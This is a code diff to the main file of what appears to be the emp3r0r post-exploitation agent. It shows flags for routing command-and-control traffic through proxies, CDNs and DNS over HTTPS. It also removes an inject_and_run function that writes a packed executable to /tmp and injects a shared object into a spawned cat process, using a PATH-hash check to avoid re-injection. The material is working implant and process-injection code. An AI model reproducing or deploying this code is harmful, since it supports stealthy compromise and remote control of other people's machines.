@@ -28,6 +28,7 @@ import (
 
 func main() {
 	var err error
+
 	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
@@ -36,12 +37,6 @@ func main() {
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
-
-	// inject
-	err = inject_and_run()
-	if err != nil {
-		log.Print(err)
-	}
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
@@ -388,43 +383,6 @@ func server(c net.Conn) {
 			log.Printf("Write: %v", err)
 		}
 	}
-}
-
-func inject_and_run() (err error) {
-	// inject self to a cat process
-	// check path hash to make sure we don't get trapped in a dead loop
-	path_hash := tun.SHA256Sum(fmt.Sprintf("emp3r0r_salt:%s", os.Getenv("PATH")))
-	if path_hash == "f74980d53e01a9ca2078f3894390606d4ecc1b0fc70d284faa16043d718ad0a5" {
-		return fmt.Errorf("This process is started by injector, aborting")
-	}
-
-	// read envv
-	fd := os.Getenv("FD")
-	if fd == "" {
-		return fmt.Errorf("FD empty")
-	}
-	packed_elf_data, err := ioutil.ReadFile(fd)
-	if err != nil {
-		return fmt.Errorf("read %s: %v", fd, err)
-	} else {
-		cmd := exec.Command("/bin/cat")
-		err = cmd.Run()
-		if err != nil {
-			return
-		}
-		go func(e error) {
-			for cmd.Process != nil {
-				e = ioutil.WriteFile("/tmp/emp3r0r", packed_elf_data, 0755)
-				if e != nil {
-					break
-				}
-				e = agent.InjectSO(cmd.Process.Pid)
-				break
-			}
-		}(err)
-	}
-
-	return
 }
 
 func isAgentAlive() bool {
